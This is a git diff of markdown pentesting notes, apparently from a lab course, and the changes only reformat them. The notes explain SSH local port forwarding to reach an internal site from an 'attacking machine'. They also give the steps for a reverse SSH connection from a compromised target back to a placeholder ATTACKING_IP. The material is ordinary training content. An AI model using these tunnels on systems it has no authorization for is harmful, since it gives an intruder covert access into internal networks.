@@ -17,9 +17,7 @@ ssh -L 8000:132.227.89.21:80 21108020@ssh.ufr-info-p6.jussieu.fr -fN
 
 You can now access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine with `localhost:8000`.
 
-```
-Good Practice use a high port, out of the way, for the local connection.
-```
+> Good Practice use a high port, out of the way, for the local connection.
 
 #### `Creating a proxy :` -D switch
 
@@ -41,7 +39,7 @@ _Reverse connections_ are very possible with the **SSH client** (and indeed may 
 
 `Before we can make a reverse connection safely, there are a few steps to take:`
 
-```
+```bash
 # 1. generate a new set of SSH keys and store them somewhere safe
 ssh-keygen
 
@@ -58,7 +56,7 @@ sudo systemctl start ssh
 # 6. With the key transferred, connect back with a reverse port forward (on the target server)
 ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
 
-or (In newer versions of the SSH client)
+# or (In newer versions of the SSH client)
 ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
 ```
 
